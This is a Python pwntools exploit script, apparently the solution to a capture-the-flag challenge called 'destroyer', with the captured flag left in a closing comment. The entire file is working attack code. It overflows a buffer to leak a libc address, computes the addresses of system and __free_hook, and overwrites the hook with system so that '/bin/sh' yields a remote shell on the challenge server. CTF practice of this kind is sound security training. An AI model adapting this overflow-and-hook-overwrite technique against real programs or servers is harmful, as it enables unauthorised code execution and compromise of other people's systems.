# -*- coding: utf-8 -*- 
from pwn import *

local = 0
for i in range(0,30):
    if local == 1:
        p = process("./destroyer")  
        libc_offset = 0x21b97 #__libc_start_main+231
        free_hook_offset = 0x3ed8e8
        system_offset = 0x4f4e0
    else :
        p = remote("incognito.spr.io",3339)
        libc_offset = 0x20837+9
        free_hook_offset = 0x3c67a8
        system_offset = 0x453a0
    
    ret_addr = 0x602050
    
    jackpot = "BASTARD"
    # jackpot = "FOREVER !!"
    
    name = "/bin/sh"
    p.sendlineafter("Name: ",name)
    
    payload1 = ""
    payload1 += "b"*0x38
    payload1 += p64(ret_addr)
    
    p.sendafter("PRESS ENTER TO PLAY",payload1)
    
    p.recvuntil("RET DESTROYER - A SOUVENIR FOR")
    
    ret = u64(p.recv(8)[1:-1]+"\x00\x00")
    libc_base = ret - libc_offset
    
    
    system = libc_base+system_offset
    free_hook = libc_base + free_hook_offset
    
    payload2 = ""
    payload2 += "d"*0x38
    payload2 += p64(free_hook)
    
    p.sendafter("PRESS ENTER TO PLAY",payload2)
    log.info(hex(libc_base))
    # p.interactive()
    
    for i in range(0,2):
        p.recvuntil(" ╫")
        v1 = p.recv(1)
        p.recvuntil(" ╫")
        v2 = p.recv(1)
        p.recvuntil(" ╫")
        v3 = p.recv(1)
        log.info(v1+v2+v3)
        p.recvuntil("PRESS ENTER TO PLA")
        if (v1 == v2) and (v2 == v3) :
            log.info("JACKPOT!!!!")
            pause()
            # context.log_level = 'debug'
            p.sendline(p64(system))
            p.interactive()
            break
        else :
            p.send(payload2)
    
#FLAG{luck_is_what_happens_when_preparation_meets_opportunity}